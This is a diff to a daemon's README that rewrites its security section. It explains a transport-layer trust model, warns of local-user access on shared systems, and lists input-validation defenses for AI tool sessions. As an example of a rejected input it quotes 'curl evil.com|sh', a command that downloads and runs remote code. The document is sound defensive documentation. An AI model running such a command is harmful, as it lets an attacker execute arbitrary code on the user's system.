@@ -148,10 +148,38 @@ server:
 
 ## Security
 
-hqsshd is designed with security in mind:
+### Security Model
+
+hqsshd delegates authentication entirely to the transport layer — it trusts all connections on its listeners. This is the same trust model used by Docker daemon, gpg-agent, and ssh-agent.
+
+**How access is controlled:**
+
+| Listener | Protection | Who can connect |
+|----------|-----------|----------------|
+| Unix socket (`/tmp/hqssh.sock`) | File permissions `0600` | Only the daemon's owning user |
+| TCP (`127.0.0.1:50051`) | Loopback bind + SSH tunnel | Any local user, or remote users via SSH |
+
+**Important: multi-user systems.** The TCP listener on `127.0.0.1:50051` is accessible to *all* local users on the machine, not just the daemon's owner. On shared systems (university servers, CI runners, shared dev boxes), this means other users could connect to your daemon and spawn sessions as your user.
+
+**Mitigation for multi-user systems:** Set `tcp_port: 0` in `~/.hqssh/daemon.yaml` to disable the TCP listener entirely. The daemon will only accept connections via the Unix socket (which is protected by filesystem permissions). Remote clients can still connect by forwarding the Unix socket over SSH:
+
+```bash
+# Client connects via Unix socket forwarding instead of TCP
+ssh -L /tmp/hqssh-remote.sock:/tmp/hqssh.sock user@host
+```
+
+### Defense in Depth
+
+Even without gRPC-layer authentication, hqsshd applies input validation to limit blast radius:
+
+- **Tool whitelist** - Session and task creation only accept tool names from `daemon.yaml` config (e.g., `claude`, `codex`, `aider`, `shell`). Arbitrary commands like `curl evil.com|sh` are rejected.
+- **Prompt injection prevention** - AI tool prompts are passed as shell positional arguments (`$1`), never interpolated into shell command strings.
+- **Path traversal protection** - Session log access validates that session IDs cannot escape the log directory.
+
+### Summary
 
 - **Local-only by default** - TCP server binds to `127.0.0.1`, accessible only via SSH tunnel
-- **No authentication layer** - Relies on SSH for authentication and encryption
+- **Transport-layer auth** - Relies on SSH for authentication and encryption
 - **Minimal privileges** - Runs as your user, no root required
 - **Open source** - Full source code available for audit
 
